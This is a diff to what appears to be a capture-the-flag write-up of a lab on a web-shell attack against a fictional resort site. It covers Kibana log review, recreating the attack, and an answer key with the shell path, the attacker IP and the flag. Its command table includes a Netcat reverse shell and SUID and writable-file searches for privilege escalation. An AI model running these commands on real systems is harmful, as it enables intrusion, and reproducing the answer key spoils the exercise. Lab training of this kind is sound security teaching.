@@ -293,7 +293,76 @@ Once the vulnerability has been exploited and you now have access to the operati
 | nc -e /bin/sh <your-ip> <port>           | A command used to begin a reverse shell via Netcat                                             |
 | find / -perm -4000 -type f 2>/dev/null   | Finds SUID (Set User ID) files, useful in privilege escalation attempts                         |
 | find / -writable -type f 2>/dev/null | grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions   |
-|
+
+These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.
+
+## Practical
+
+Your task today is two-fold. First, you must access Kibana on MACHINE_IP:5601 to investigate the attack and answer the blue questions below. Then, you will proceed to Frosty Pines Resort's website at http://frostypines.thm and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.
+
+Please note, to access http://frostypines.thm, you will need to reference it within your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: **echo "MACHINE_IP frostypines.thm" >> /etc/hosts**
+
+If you do not see an IP address (i.e. 10.10.x.x) and only MACHINE IP, ensure that you have started the target machine by pressing on the green "Start Machine" button further up the task, within the heading "Connecting to the Machine".
+
+To review the logs of the attack on Frosty Pines Resorts, make sure you select the "**frostypines-resorts**" collection within ELK. Such as below:
+
+![](index.png){: width="388" height="414"}
+
+The date and time that you will need to use when reviewing logs will be between **11:30 and 12:00 on October 3rd 2024**.
+
+![](index2.png){: width="1278" height="475"}
+
+Remember, to access the Frosty Pines Resorts website (http://frostypines.thm), you will need to reference it in your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: **echo "MACHINE_IP frostypines.thm" >> /etc/hosts**
+
+
+## Answers
+
+### Question 1
+
+**BLUE**: Where was the web shell uploaded to?
+
+<details>
+  <summary style="cursor:pointer; padding:10px; border:1px solid #ccc; background-color:#f0f0f0; user-select: none;">Answer</summary>
+  <div style="padding:10px; border:1px solid #ccc;">
+    <span onclick="navigator.clipboard.writeText('/media/images/rooms/shell.php')" style="cursor:pointer;">/media/images/rooms/shell.php</span>
+    <i onclick="navigator.clipboard.writeText('/media/images/rooms/shell.php')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
+  </div>
+</details>
+
+### Question 2
+
+**BLUE**: What IP address accessed the web shell?
+
+<details>
+  <summary style="cursor:pointer; padding:10px; border:1px solid #ccc; background-color:#f0f0f0; user-select: none;">Answer</summary>
+  <div style="padding:10px; border:1px solid #ccc;">
+    <span onclick="navigator.clipboard.writeText('10.11.83.34')" style="cursor:pointer;">10.11.83.34</span>
+    <i onclick="navigator.clipboard.writeText('10.11.83.34')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
+  </div>
+</details>
+
+### Question 3
+
+**RED**: What is the contents of the flag.txt?
+
+<details>
+  <summary style="cursor:pointer; padding:10px; border:1px solid #ccc; background-color:#f0f0f0; user-select: none;">Answer</summary>
+  <div style="padding:10px; border:1px solid #ccc;">
+    <span onclick="navigator.clipboard.writeText('THM{Gl1tch_Was_H3r3}')" style="cursor:pointer;">THM{Gl1tch_Was_H3r3}</span>
+    <i onclick="navigator.clipboard.writeText('THM{Gl1tch_Was_H3r3}')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
+  </div>
+</details>
+
+
+
+
+
+
+
+
+
+
+
 
 
 
